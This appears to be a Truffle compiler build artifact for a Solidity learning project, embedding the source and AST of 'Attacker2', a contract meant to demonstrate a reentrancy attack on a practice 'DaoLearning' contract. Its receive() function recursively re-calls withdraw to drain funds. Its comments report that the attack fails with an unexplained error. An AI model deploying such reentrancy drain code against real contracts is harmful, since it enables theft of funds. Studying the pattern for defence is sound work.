                "src": "1859:6:3",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "tail",
                "nodeType": "YulTypedName",
                "src": "1870:4:3",
                "type": ""
              }
            ],
            "src": "1779:218:3"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "2045:78:3",
              "statements": [
                {
                  "body": {
                    "nodeType": "YulBlock",
                    "src": "2101:16:3",
                    "statements": [
                      {
                        "expression": {
                          "arguments": [
                            {
                              "kind": "number",
                              "nodeType": "YulLiteral",
                              "src": "2110:1:3",
                              "type": "",
                              "value": "0"
                            },
                            {
                              "kind": "number",
                              "nodeType": "YulLiteral",
                              "src": "2113:1:3",
                              "type": "",
                              "value": "0"
                            }
                          ],
                          "functionName": {
                            "name": "revert",
                            "nodeType": "YulIdentifier",
                            "src": "2103:6:3"
                          },
                          "nodeType": "YulFunctionCall",
                          "src": "2103:12:3"
                        },
                        "nodeType": "YulExpressionStatement",
                        "src": "2103:12:3"
                      }
                    ]
                  },
                  "condition": {
                    "arguments": [
                      {
                        "arguments": [
                          {
                            "name": "value",
                            "nodeType": "YulIdentifier",
                            "src": "2068:5:3"
                          },
                          {
                            "arguments": [
                              {
                                "name": "value",
                                "nodeType": "YulIdentifier",
                                "src": "2092:5:3"
                              }
                            ],
                            "functionName": {
                              "name": "cleanup_t_uint64",
                              "nodeType": "YulIdentifier",
                              "src": "2075:16:3"
                            },
                            "nodeType": "YulFunctionCall",
                            "src": "2075:23:3"
                          }
                        ],
                        "functionName": {
                          "name": "eq",
                          "nodeType": "YulIdentifier",
                          "src": "2065:2:3"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "2065:34:3"
                      }
                    ],
                    "functionName": {
                      "name": "iszero",
                      "nodeType": "YulIdentifier",
                      "src": "2058:6:3"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "2058:42:3"
                  },
                  "nodeType": "YulIf",
                  "src": "2055:62:3"
                }
              ]
            },
            "name": "validator_revert_t_uint64",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "value",
                "nodeType": "YulTypedName",
                "src": "2038:5:3",
                "type": ""
              }
            ],
            "src": "2003:120:3"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "2191:79:3",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "2201:22:3",
                  "value": {
                    "arguments": [
                      {
                        "name": "offset",
                        "nodeType": "YulIdentifier",
                        "src": "2216:6:3"
                      }
                    ],
                    "functionName": {
                      "name": "mload",
                      "nodeType": "YulIdentifier",
                      "src": "2210:5:3"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "2210:13:3"
                  },
                  "variableNames": [
                    {
                      "name": "value",
                      "nodeType": "YulIdentifier",
                      "src": "2201:5:3"
                    }
                  ]
                },
                {
                  "expression": {
                    "arguments": [
                      {
                        "name": "value",
                        "nodeType": "YulIdentifier",
                        "src": "2258:5:3"
                      }
                    ],
                    "functionName": {
                      "name": "validator_revert_t_uint64",
                      "nodeType": "YulIdentifier",
                      "src": "2232:25:3"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "2232:32:3"
                  },
                  "nodeType": "YulExpressionStatement",
                  "src": "2232:32:3"
                }
              ]
            },
            "name": "abi_decode_t_uint64_fromMemory",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "offset",
                "nodeType": "YulTypedName",
                "src": "2169:6:3",
                "type": ""
              },
              {
                "name": "end",
                "nodeType": "YulTypedName",
                "src": "2177:3:3",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "value",
                "nodeType": "YulTypedName",
                "src": "2185:5:3",
                "type": ""
              }
            ],
            "src": "2129:141:3"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "2352:273:3",
              "statements": [
                {
                  "body": {
                    "nodeType": "YulBlock",
                    "src": "2398:83:3",
                    "statements": [
                      {
                        "expression": {
                          "arguments": [],
                          "functionName": {
                            "name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
                            "nodeType": "YulIdentifier",
                            "src": "2400:77:3"
                          },
                          "nodeType": "YulFunctionCall",
                          "src": "2400:79:3"
                        },
                        "nodeType": "YulExpressionStatement",
                        "src": "2400:79:3"
                      }
                    ]
                  },
                  "condition": {
                    "arguments": [
                      {
                        "arguments": [
                          {
                            "name": "dataEnd",
                            "nodeType": "YulIdentifier",
                            "src": "2373:7:3"
                          },
                          {
                            "name": "headStart",
                            "nodeType": "YulIdentifier",
                            "src": "2382:9:3"
                          }
                        ],
                        "functionName": {
                          "name": "sub",
                          "nodeType": "YulIdentifier",
                          "src": "2369:3:3"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "2369:23:3"
                      },
                      {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "2394:2:3",
                        "type": "",
                        "value": "32"
                      }
                    ],
                    "functionName": {
                      "name": "slt",
                      "nodeType": "YulIdentifier",
                      "src": "2365:3:3"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "2365:32:3"
                  },
                  "nodeType": "YulIf",
                  "src": "2362:119:3"
                },
                {
                  "nodeType": "YulBlock",
                  "src": "2491:127:3",
                  "statements": [
                    {
                      "nodeType": "YulVariableDeclaration",
                      "src": "2506:15:3",
                      "value": {
                        "kind": "number",
                        "nodeType": "YulLiteral",
                        "src": "2520:1:3",
                        "type": "",
                        "value": "0"
                      },
                      "variables": [
                        {
                          "name": "offset",
                          "nodeType": "YulTypedName",
                          "src": "2510:6:3",
                          "type": ""
                        }
                      ]
                    },
                    {
                      "nodeType": "YulAssignment",
                      "src": "2535:73:3",
                      "value": {
                        "arguments": [
                          {
                            "arguments": [
                              {
                                "name": "headStart",
                                "nodeType": "YulIdentifier",
                                "src": "2580:9:3"
                              },
                              {
                                "name": "offset",
                                "nodeType": "YulIdentifier",
                                "src": "2591:6:3"
                              }
                            ],
                            "functionName": {
                              "name": "add",
                              "nodeType": "YulIdentifier",
                              "src": "2576:3:3"
                            },
                            "nodeType": "YulFunctionCall",
                            "src": "2576:22:3"
                          },
                          {
                            "name": "dataEnd",
                            "nodeType": "YulIdentifier",
                            "src": "2600:7:3"
                          }
                        ],
                        "functionName": {
                          "name": "abi_decode_t_uint64_fromMemory",
                          "nodeType": "YulIdentifier",
                          "src": "2545:30:3"
                        },
                        "nodeType": "YulFunctionCall",
                        "src": "2545:63:3"
                      },
                      "variableNames": [
                        {
                          "name": "value0",
                          "nodeType": "YulIdentifier",
                          "src": "2535:6:3"
                        }
                      ]
                    }
                  ]
                }
              ]
            },
            "name": "abi_decode_tuple_t_uint64_fromMemory",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "headStart",
                "nodeType": "YulTypedName",
                "src": "2322:9:3",
                "type": ""
              },
              {
                "name": "dataEnd",
                "nodeType": "YulTypedName",
                "src": "2333:7:3",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "value0",
                "nodeType": "YulTypedName",
                "src": "2345:6:3",
                "type": ""
              }
            ],
            "src": "2276:349:3"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "2676:32:3",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "2686:16:3",
                  "value": {
                    "name": "value",
                    "nodeType": "YulIdentifier",
                    "src": "2697:5:3"
                  },
                  "variableNames": [
                    {
                      "name": "cleaned",
                      "nodeType": "YulIdentifier",
                      "src": "2686:7:3"
                    }
                  ]
                }
              ]
            },
            "name": "cleanup_t_uint256",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "value",
                "nodeType": "YulTypedName",
                "src": "2658:5:3",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "cleaned",
                "nodeType": "YulTypedName",
                "src": "2668:7:3",
                "type": ""
              }
            ],
            "src": "2631:77:3"
          },
          {
            "body": {
              "nodeType": "YulBlock",
              "src": "2759:146:3",
              "statements": [
                {
                  "nodeType": "YulAssignment",
                  "src": "2769:25:3",
                  "value": {
                    "arguments": [
                      {
                        "name": "x",
                        "nodeType": "YulIdentifier",
                        "src": "2792:1:3"
                      }
                    ],
                    "functionName": {
                      "name": "cleanup_t_uint256",
                      "nodeType": "YulIdentifier",
                      "src": "2774:17:3"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "2774:20:3"
                  },
                  "variableNames": [
                    {
                      "name": "x",
                      "nodeType": "YulIdentifier",
                      "src": "2769:1:3"
                    }
                  ]
                },
                {
                  "nodeType": "YulAssignment",
                  "src": "2803:25:3",
                  "value": {
                    "arguments": [
                      {
                        "name": "y",
                        "nodeType": "YulIdentifier",
                        "src": "2826:1:3"
                      }
                    ],
                    "functionName": {
                      "name": "cleanup_t_uint256",
                      "nodeType": "YulIdentifier",
                      "src": "2808:17:3"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "2808:20:3"
                  },
                  "variableNames": [
                    {
                      "name": "y",
                      "nodeType": "YulIdentifier",
                      "src": "2803:1:3"
                    }
                  ]
                },
                {
                  "body": {
                    "nodeType": "YulBlock",
                    "src": "2850:22:3",
                    "statements": [
                      {
                        "expression": {
                          "arguments": [],
                          "functionName": {
                            "name": "panic_error_0x11",
                            "nodeType": "YulIdentifier",
                            "src": "2852:16:3"
                          },
                          "nodeType": "YulFunctionCall",
                          "src": "2852:18:3"
                        },
                        "nodeType": "YulExpressionStatement",
                        "src": "2852:18:3"
                      }
                    ]
                  },
                  "condition": {
                    "arguments": [
                      {
                        "name": "x",
                        "nodeType": "YulIdentifier",
                        "src": "2844:1:3"
                      },
                      {
                        "name": "y",
                        "nodeType": "YulIdentifier",
                        "src": "2847:1:3"
                      }
                    ],
                    "functionName": {
                      "name": "lt",
                      "nodeType": "YulIdentifier",
                      "src": "2841:2:3"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "2841:8:3"
                  },
                  "nodeType": "YulIf",
                  "src": "2838:34:3"
                },
                {
                  "nodeType": "YulAssignment",
                  "src": "2882:17:3",
                  "value": {
                    "arguments": [
                      {
                        "name": "x",
                        "nodeType": "YulIdentifier",
                        "src": "2894:1:3"
                      },
                      {
                        "name": "y",
                        "nodeType": "YulIdentifier",
                        "src": "2897:1:3"
                      }
                    ],
                    "functionName": {
                      "name": "sub",
                      "nodeType": "YulIdentifier",
                      "src": "2890:3:3"
                    },
                    "nodeType": "YulFunctionCall",
                    "src": "2890:9:3"
                  },
                  "variableNames": [
                    {
                      "name": "diff",
                      "nodeType": "YulIdentifier",
                      "src": "2882:4:3"
                    }
                  ]
                }
              ]
            },
            "name": "checked_sub_t_uint256",
            "nodeType": "YulFunctionDefinition",
            "parameters": [
              {
                "name": "x",
                "nodeType": "YulTypedName",
                "src": "2745:1:3",
                "type": ""
              },
              {
                "name": "y",
                "nodeType": "YulTypedName",
                "src": "2748:1:3",
                "type": ""
              }
            ],
            "returnVariables": [
              {
                "name": "diff",
                "nodeType": "YulTypedName",
                "src": "2754:4:3",
                "type": ""
              }
            ],
            "src": "2714:191:3"
          }
        ]
      },
      "contents": "{\n\n    function panic_error_0x11() {\n        mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)\n        mstore(4, 0x11)\n        revert(0, 0x24)\n    }\n\n    function cleanup_t_uint64(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffff)\n    }\n\n    function increment_t_uint64(value) -> ret {\n        value := cleanup_t_uint64(value)\n        if eq(value, 0xffffffffffffffff) { panic_error_0x11() }\n        ret := add(value, 1)\n    }\n\n    function allocate_unbounded() -> memPtr {\n        memPtr := mload(64)\n    }\n\n    function revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() {\n        revert(0, 0)\n    }\n\n    function revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db() {\n        revert(0, 0)\n    }\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function cleanup_t_address(value) -> cleaned {\n        cleaned := cleanup_t_uint160(value)\n    }\n\n    function validator_revert_t_address(value) {\n        if iszero(eq(value, cleanup_t_address(value))) { revert(0, 0) }\n    }\n\n    function abi_decode_t_address(offset, end) -> value {\n        value := calldataload(offset)\n        validator_revert_t_address(value)\n    }\n\n    function abi_decode_tuple_t_address(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_address(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function abi_encode_t_uint64_to_t_uint64_fromStack(value, pos) {\n        mstore(pos, cleanup_t_uint64(value))\n    }\n\n    function abi_encode_tuple_t_uint64__to_t_uint64__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_uint64_to_t_uint64_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function validator_revert_t_uint64(value) {\n        if iszero(eq(value, cleanup_t_uint64(value))) { revert(0, 0) }\n    }\n\n    function abi_decode_t_uint64_fromMemory(offset, end) -> value {\n        value := mload(offset)\n        validator_revert_t_uint64(value)\n    }\n\n    function abi_decode_tuple_t_uint64_fromMemory(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_uint64_fromMemory(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function cleanup_t_uint256(value) -> cleaned {\n        cleaned := value\n    }\n\n    function checked_sub_t_uint256(x, y) -> diff {\n        x := cleanup_t_uint256(x)\n        y := cleanup_t_uint256(y)\n\n        if lt(x, y) { panic_error_0x11() }\n\n        diff := sub(x, y)\n    }\n\n}\n",
      "id": 3,
      "language": "Yul",
      "name": "#utility.yul"
    }
  ],
  "sourceMap": "741:1956:0:-:0;;;861:1;825:37;;;;;;;;;;;;;;;;;;;;1090:5;1073:22;;;;;;;;;;;;;;;;;;;;1168:60;;;;;;;;;;1209:10;1193:5;;:27;;;;;;;;;;;;;;;;;;741:1956;;;;;;",
  "deployedSourceMap": "741:1956:0:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;2246:9;;;;;;;;;;;:50;;;;;814:4;2259:37;;:17;;;;;;;;;;:37;;;2246:50;2242:443;;;2313:17;;:19;;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;2443:9;2427:3;;;;;;;;;;;2419:20;;;:33;2415:259;;2509:17;:15;:17::i;:::-;2415:259;;;2653:5;2641:9;;:17;;;;;;;;;;;;;;;;;;2415:259;2242:443;741:1956;;;;;1298:86;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;:::i;:::-;;1607:97;;;;;;;;;;;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;1455:94;;;:::i;:::-;;1780:81;;;;;;;;;;;;;:::i;:::-;;1947:120;;;;;;;;;;;;;:::i;:::-;;1780:81;1825:3;;;;;;;;;;;:12;;;1838:14;:12;:14::i;:::-;1825:28;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1780:81::o;1298:86::-;1371:4;1353:3;;:23;;;;;;;;;;;;;;;;;;1298:86;:::o;1607:97::-;1652:6;1678:3;;;;;;;;;;;:16;;;:18;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;1671:25;;1607:97;:::o;1455:94::-;1505:3;;;;;;;;;;;:14;;;1537:1;1527:9;:11;;;;:::i;:::-;1505:36;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1455:94::o;1947:120::-;1995:4;1983:9;;:16;;;;;;;;;;;;;;;;;;2030:1;2010:17;;:21;;;;;;;;;;;;;;;;;;2042:17;:15;:17::i;:::-;1947:120::o;7:180:3:-;55:77;52:1;45:88;152:4;149:1;142:15;176:4;173:1;166:15;193:101;229:7;269:18;262:5;258:30;247:41;;193:101;;;:::o;300:183::-;338:3;361:23;378:5;361:23;:::i;:::-;352:32;;406:18;399:5;396:29;393:55;;428:18;;:::i;:::-;393:55;475:1;468:5;464:13;457:20;;300:183;;;:::o;570:117::-;679:1;676;669:12;816:126;853:7;893:42;886:5;882:54;871:65;;816:126;;;:::o;948:96::-;985:7;1014:24;1032:5;1014:24;:::i;:::-;1003:35;;948:96;;;:::o;1050:122::-;1123:24;1141:5;1123:24;:::i;:::-;1116:5;1113:35;1103:63;;1162:1;1159;1152:12;1103:63;1050:122;:::o;1178:139::-;1224:5;1262:6;1249:20;1240:29;;1278:33;1305:5;1278:33;:::i;:::-;1178:139;;;;:::o;1323:329::-;1382:6;1431:2;1419:9;1410:7;1406:23;1402:32;1399:119;;;1437:79;;:::i;:::-;1399:119;1557:1;1582:53;1627:7;1618:6;1607:9;1603:22;1582:53;:::i;:::-;1572:63;;1528:117;1323:329;;;;:::o;1658:115::-;1743:23;1760:5;1743:23;:::i;:::-;1738:3;1731:36;1658:115;;:::o;1779:218::-;1870:4;1908:2;1897:9;1893:18;1885:26;;1921:69;1987:1;1976:9;1972:17;1963:6;1921:69;:::i;:::-;1779:218;;;;:::o;2003:120::-;2075:23;2092:5;2075:23;:::i;:::-;2068:5;2065:34;2055:62;;2113:1;2110;2103:12;2055:62;2003:120;:::o;2129:141::-;2185:5;2216:6;2210:13;2201:22;;2232:32;2258:5;2232:32;:::i;:::-;2129:141;;;;:::o;2276:349::-;2345:6;2394:2;2382:9;2373:7;2369:23;2365:32;2362:119;;;2400:79;;:::i;:::-;2362:119;2520:1;2545:63;2600:7;2591:6;2580:9;2576:22;2545:63;:::i;:::-;2535:73;;2491:127;2276:349;;;;:::o;2631:77::-;2668:7;2697:5;2686:16;;2631:77;;;:::o;2714:191::-;2754:4;2774:20;2792:1;2774:20;:::i;:::-;2769:25;;2808:20;2826:1;2808:20;:::i;:::-;2803:25;;2847:1;2844;2841:8;2838:34;;;2852:18;;:::i;:::-;2838:34;2897:1;2894;2890:9;2882:17;;2714:191;;;;:::o",
  "source": "// SPDX-License-Identifier: UNLICENSED\r\n\r\npragma solidity >=0.7.0 <0.9.0;\r\n\r\nimport \"./DaoLearning.sol\";\r\n\r\n//Test contract to demonstrate a Reentrancy attack\r\n//While it is structured better than AttackerContract.sol, the same\r\n//unknown problem persists when an attack is initiated (see below)\r\n\r\n\r\n//Note: The problem is due to some unknown error that triggers a jump\r\n//to invalid address on purpose from the EVM to force an out-of-gas\r\n//error.  The base problem is not known yet, but it isn't the gas limit\r\n\r\n//Also, the loop limit and iteration variables are to make sure that the\r\n//stack doesn't reach 1024, which is the stack limit in the EVM\r\n//      Built on a misconception!  This does not apply to the stack limit in the EVM\r\ncontract Attacker2 {\r\n\r\n    uint64 constant internal ATTACK_LOOP_LIMIT = 1020;\r\n    uint64 internal current_iteration = 0;\r\n\r\n    //Instantiate the owner's address, and the contract to be attacked\r\n    address payable owner;\r\n    DaoLearning dao;\r\n\r\n    //Whether the contract is attacking (as opposed to withdrawing normally)\r\n    bool attacking = false;\r\n\r\n    //Constructs this attacker, saving the owner to a variable\r\n    constructor() {\r\n        owner = payable(msg.sender);\r\n    }\r\n\r\n    //Initialize the DAO contract variable with it's address\r\n    function initializeDao(address addr) public {\r\n        dao = DaoLearning(addr);\r\n    }\r\n\r\n    //Deposit money onto this contract's account with the DAO\r\n    function depositToDao() public payable {\r\n        dao.mintTokens{value: msg.value-1}();\r\n    }\r\n\r\n    //Check this contract's balance with the DAO\r\n    function myDaoBalance() public view returns (uint64) {\r\n        return dao.checkBalance();\r\n    }\r\n\r\n    //Withdraw the money stored with the DAO back to this contract\r\n    function withdrawFromDao() public {\r\n        dao.withdraw(myDaoBalance());\r\n    }\r\n\r\n    //Begins a withdrawl from the DAO, with the bool that triggers recursion\r\n    function attack() public {\r\n        attacking = true;\r\n        current_iteration = 1;\r\n        withdrawFromDao();\r\n    }\r\n\r\n    //Receive function, which acts as normal until \"attacking\" is set to true\r\n    receive() external payable {\r\n        //If the contract is attacking right now\r\n        if (attacking && current_iteration < ATTACK_LOOP_LIMIT) {\r\n            current_iteration++;\r\n            //Check to see if the DAO still has more money to take\r\n            if (address(dao).balance >= msg.value) {\r\n                //If so, take more\r\n                withdrawFromDao();\r\n            } else {\r\n                //If not, stop taking, and allow the call stack to close\r\n                attacking = false;\r\n            }\r\n        }\r\n    }\r\n\r\n}",
  "sourcePath": "C:\\Users\\mbwil\\Documents\\Programming\\Solidity\\Truffle\\FirstProject\\contracts\\Attacker2.sol",
  "ast": {
    "absolutePath": "project:/contracts/Attacker2.sol",
    "exportedSymbols": {
      "Attacker2": [
        123
      ],
      "DaoLearning": [
        254
      ]
    },
    "id": 124,
    "license": "UNLICENSED",
    "nodeType": "SourceUnit",
    "nodes": [
      {
        "id": 1,
        "literals": [
          "solidity",
          ">=",
          "0.7",
          ".0",
          "<",
          "0.9",
          ".0"
        ],
        "nodeType": "PragmaDirective",
        "src": "42:31:0"
      },
      {
        "absolutePath": "project:/contracts/DaoLearning.sol",
        "file": "./DaoLearning.sol",
        "id": 2,
        "nameLocation": "-1:-1:-1",
        "nodeType": "ImportDirective",
        "scope": 124,
        "sourceUnit": 255,
        "src": "77:27:0",
        "symbolAliases": [],
        "unitAlias": ""
      },
      {
        "abstract": false,
        "baseContracts": [],
        "canonicalName": "Attacker2",
        "contractDependencies": [],
        "contractKind": "contract",
        "fullyImplemented": true,
        "id": 123,
        "linearizedBaseContracts": [
          123
        ],
        "name": "Attacker2",
        "nameLocation": "750:9:0",
        "nodeType": "ContractDefinition",
        "nodes": [
          {
            "constant": true,
            "id": 5,
            "mutability": "constant",
            "name": "ATTACK_LOOP_LIMIT",
            "nameLocation": "794:17:0",
            "nodeType": "VariableDeclaration",
            "scope": 123,
            "src": "769:49:0",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_uint64",
              "typeString": "uint64"
            },
            "typeName": {
              "id": 3,
              "name": "uint64",
              "nodeType": "ElementaryTypeName",
              "src": "769:6:0",
              "typeDescriptions": {
                "typeIdentifier": "t_uint64",
                "typeString": "uint64"
              }
            },
            "value": {
              "hexValue": "31303230",
              "id": 4,
              "isConstant": false,
              "isLValue": false,
              "isPure": true,
              "kind": "number",
              "lValueRequested": false,
              "nodeType": "Literal",
              "src": "814:4:0",
              "typeDescriptions": {
                "typeIdentifier": "t_rational_1020_by_1",
                "typeString": "int_const 1020"
              },
              "value": "1020"
            },
            "visibility": "internal"
          },
          {
            "constant": false,
            "id": 8,
            "mutability": "mutable",
            "name": "current_iteration",
            "nameLocation": "841:17:0",
            "nodeType": "VariableDeclaration",
            "scope": 123,
            "src": "825:37:0",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_uint64",
              "typeString": "uint64"
            },
            "typeName": {
              "id": 6,
              "name": "uint64",
              "nodeType": "ElementaryTypeName",
              "src": "825:6:0",
              "typeDescriptions": {
                "typeIdentifier": "t_uint64",
                "typeString": "uint64"
              }
            },
            "value": {
              "hexValue": "30",
              "id": 7,
              "isConstant": false,
              "isLValue": false,
              "isPure": true,
              "kind": "number",
              "lValueRequested": false,
              "nodeType": "Literal",
              "src": "861:1:0",
              "typeDescriptions": {
                "typeIdentifier": "t_rational_0_by_1",
                "typeString": "int_const 0"
              },
              "value": "0"
            },
            "visibility": "internal"
          },
          {
            "constant": false,
            "id": 10,
            "mutability": "mutable",
            "name": "owner",
            "nameLocation": "959:5:0",
            "nodeType": "VariableDeclaration",
            "scope": 123,
            "src": "943:21:0",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_address_payable",
              "typeString": "address payable"
            },
            "typeName": {
              "id": 9,
              "name": "address",
              "nodeType": "ElementaryTypeName",
              "src": "943:15:0",
              "stateMutability": "payable",
              "typeDescriptions": {
                "typeIdentifier": "t_address_payable",
                "typeString": "address payable"
              }
            },
            "visibility": "internal"
          },
          {
            "constant": false,
            "id": 13,
            "mutability": "mutable",
            "name": "dao",
            "nameLocation": "983:3:0",
            "nodeType": "VariableDeclaration",
            "scope": 123,
            "src": "971:15:0",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_contract$_DaoLearning_$254",
              "typeString": "contract DaoLearning"
            },
            "typeName": {
              "id": 12,
              "nodeType": "UserDefinedTypeName",
              "pathNode": {
                "id": 11,
                "name": "DaoLearning",
                "nodeType": "IdentifierPath",
                "referencedDeclaration": 254,
                "src": "971:11:0"
              },
              "referencedDeclaration": 254,
              "src": "971:11:0",
              "typeDescriptions": {
                "typeIdentifier": "t_contract$_DaoLearning_$254",
                "typeString": "contract DaoLearning"
              }
            },
            "visibility": "internal"
          },
          {
            "constant": false,
            "id": 16,
            "mutability": "mutable",
            "name": "attacking",
            "nameLocation": "1078:9:0",
            "nodeType": "VariableDeclaration",
            "scope": 123,
            "src": "1073:22:0",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_bool",
              "typeString": "bool"
            },
            "typeName": {
              "id": 14,
              "name": "bool",
              "nodeType": "ElementaryTypeName",
              "src": "1073:4:0",
              "typeDescriptions": {
                "typeIdentifier": "t_bool",
                "typeString": "bool"
              }
            },
            "value": {
              "hexValue": "66616c7365",
              "id": 15,
              "isConstant": false,
              "isLValue": false,
              "isPure": true,
              "kind": "bool",
              "lValueRequested": false,
              "nodeType": "Literal",
              "src": "1090:5:0",
              "typeDescriptions": {
                "typeIdentifier": "t_bool",
                "typeString": "bool"
              },
              "value": "false"
            },
            "visibility": "internal"
          },
          {
            "body": {
              "id": 27,
              "nodeType": "Block",
              "src": "1182:46:0",
              "statements": [
                {
                  "expression": {
                    "id": 25,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "id": 19,
                      "name": "owner",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 10,
                      "src": "1193:5:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_address_payable",
                        "typeString": "address payable"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "arguments": [
                        {
                          "expression": {
                            "id": 22,
                            "name": "msg",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 4294967281,
                            "src": "1209:3:0",
                            "typeDescriptions": {
                              "typeIdentifier": "t_magic_message",
                              "typeString": "msg"
                            }
                          },
                          "id": 23,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "memberName": "sender",
                          "nodeType": "MemberAccess",
                          "src": "1209:10:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        ],
                        "id": 21,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "lValueRequested": false,
                        "nodeType": "ElementaryTypeNameExpression",
                        "src": "1201:8:0",
                        "typeDescriptions": {
                          "typeIdentifier": "t_type$_t_address_payable_$",
                          "typeString": "type(address payable)"
                        },
                        "typeName": {
                          "id": 20,
                          "name": "address",
                          "nodeType": "ElementaryTypeName",
                          "src": "1201:8:0",
                          "stateMutability": "payable",
                          "typeDescriptions": {}
                        }
                      },
                      "id": 24,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "kind": "typeConversion",
                      "lValueRequested": false,
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "1201:19:0",
                      "tryCall": false,
                      "typeDescriptions": {
                        "typeIdentifier": "t_address_payable",
                        "typeString": "address payable"
                      }
                    },
                    "src": "1193:27:0",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address_payable",
                      "typeString": "address payable"
                    }
                  },
                  "id": 26,
                  "nodeType": "ExpressionStatement",
                  "src": "1193:27:0"
                }
              ]
            },
            "id": 28,
            "implemented": true,
            "kind": "constructor",
            "modifiers": [],
            "name": "",
            "nameLocation": "-1:-1:-1",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 17,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "1179:2:0"
            },
            "returnParameters": {
              "id": 18,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "1182:0:0"
            },
            "scope": 123,
            "src": "1168:60:0",
            "stateMutability": "nonpayable",
            "virtual": false,
            "visibility": "public"
          },
          {
            "body": {
              "id": 39,
              "nodeType": "Block",
              "src": "1342:42:0",
              "statements": [
                {
                  "expression": {
                    "id": 37,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "id": 33,
                      "name": "dao",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 13,
                      "src": "1353:3:0",
                      "typeDescriptions": {
                        "typeIdentifier": "t_contract$_DaoLearning_$254",
                        "typeString": "contract DaoLearning"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "arguments": [
                        {
                          "id": 35,
                          "name": "addr",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 30,
                          "src": "1371:4:0",
                          "typeDescriptions": {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        }
                      ],
